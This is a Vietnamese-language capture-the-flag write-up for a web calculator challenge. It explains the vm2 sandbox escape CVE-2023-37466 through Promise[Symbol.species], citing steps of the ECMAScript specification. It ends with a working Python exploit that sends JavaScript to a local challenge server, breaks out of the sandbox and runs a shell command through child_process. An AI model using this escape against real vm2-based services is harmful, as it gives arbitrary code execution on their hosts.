---
title: WEB - EHC Caculator
---

Lỗi: CVE-2023-37466
Cách làm: Dựa trên poc khá hay của leesh3288: Sandbox Escape in vm2@3.9.19 via `Promise[@@species]` · GitHub

Dựa vào method Promise[Symbol.species] từ lớp cha, ta hoàn toàn có lấy được các constructor được dùng để xây dựng lên
giá trị trả về của Promise

Dựa vào đó, ta hoàn toàn có thể viết lại hàm constructor của promise (tương tự như prototype pollute) từ đó có thể truy
cập vào executor và viết lại handler khi promise được resolve hoặc reject và set giá trị cho hai biến
resultCapability.[[Resolve]] and resultCapability.[[Reject]].

Biến resultCapability.[[Reject]] được sử dụng vào 27.2.5.4.1 PerformPromiseThen trong trường hợp bị reject

7. Let fulfillReaction be the PromiseReaction { [[Capability]]: resultCapability, [[Type]]: Fulfill, [[Handler]]:
   onFulfilledJobCallback }.
8. Let rejectReaction be the PromiseReaction { [[Capability]]: resultCapability, [[Type]]: Reject, [[Handler]]:
   onRejectedJobCallback }.
9. If promise.[[PromiseState]] is pending, then
   a. Append fulfillReaction as the last element of the List that is promise.[[PromiseFulfillReactions]].
   b. Append rejectReaction as the last element of the List that is promise.[[PromiseRejectReactions]].
10. Else if promise.[[PromiseState]] is fulfilled, then
    a. Let value be promise.[[PromiseResult]].
    b. Let fulfillJob be NewPromiseReactionJob(fulfillReaction, value).
    c. Perform HostEnqueuePromiseJob(fulfillJob.[[Job]], fulfillJob.[[Realm]]).
11. Else,
    a. Assert: The value of promise.[[PromiseState]] is rejected.
    b. Let reason be promise.[[PromiseResult]].
    c. If promise.[[PromiseIsHandled]] is false, perform HostPromiseRejectionTracker(promise, "handle").
    d. Let rejectJob be NewPromiseReactionJob(rejectReaction, reason).
    e. Perform HostEnqueuePromiseJob(rejectJob.[[Job]], rejectJob.[[Realm]]).

Khi bị reject PerforPromiseThen sẽ tạo thêm một 27.2.2.1 NewPromiseReactionJob ( reaction, argument )
mới với promiseCapability.[[Reject]] mà attacker đang kiểm soát

1. Let job be a new Job Abstract Closure with no parameters that captures reaction and argument and performs the
   following steps when called:
   a. Let promiseCapability be reaction.[[Capability]].
   b. Let type be reaction.[[Type]].
   c. Let handler be reaction.[[Handler]].
   d. **If handler is empty, then**
   i. If type is Fulfill, let handlerResult be NormalCompletion(argument).
   ii. Else,
    1. Assert: type is Reject.
    2. **Let handlerResult be ThrowCompletion(argument).**
       e. Else, let handlerResult be Completion(HostCallJobCallback(handler, undefined, « argument »)).
       f. If promiseCapability is undefined, then
       i. Assert: handlerResult is not an abrupt completion.
       ii. Return empty.
       g. Assert: promiseCapability is a PromiseCapability Record.
       h. **If handlerResult is an abrupt completion, then**
       i. **Return ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).**
       i. Else,
       i. Return ? Call(promiseCapability.[[Resolve]], undefined, « handlerResult.[[Value]] »).

Thứ chúng ta muốn ở đây là ThrowCompletion, khi trương trình không thể fullfill được vì gặp lỗi, ngay lập hàm sẽ throw
ra lỗi để người dùng catch, mà ở đây chúng ta đã kiểm soát thành công được hàm promiseCapability.[[Reject]] nên chúng ta
hoàn toàn có thể dùng hàm này để thoát khỏi jail và chạy code trên môi trường thật.

Tận dụng lại exploit trên, ta có thể viết lại làm sao mà trương trình chạy một function trước khi return về và thoát
khỏi jail.

Exploit:

```python
import httpx

URL = "http://127.0.0.1:36145"
calc = """(function() {
    async function fn() {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
    var p = fn();
    p.constructor = {
        [Symbol.species]: class FakePromise {
            constructor(executor) {
                executor(
                    (x) => x,
                    (err) => { err.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag > static/index.html'); }
                )
            }
        }
    };
    p.then();
})()
"""

req = httpx.post(f"{URL}/calc", data={"calc": ''.join(calc.split("\n"))})
print(req.text)
```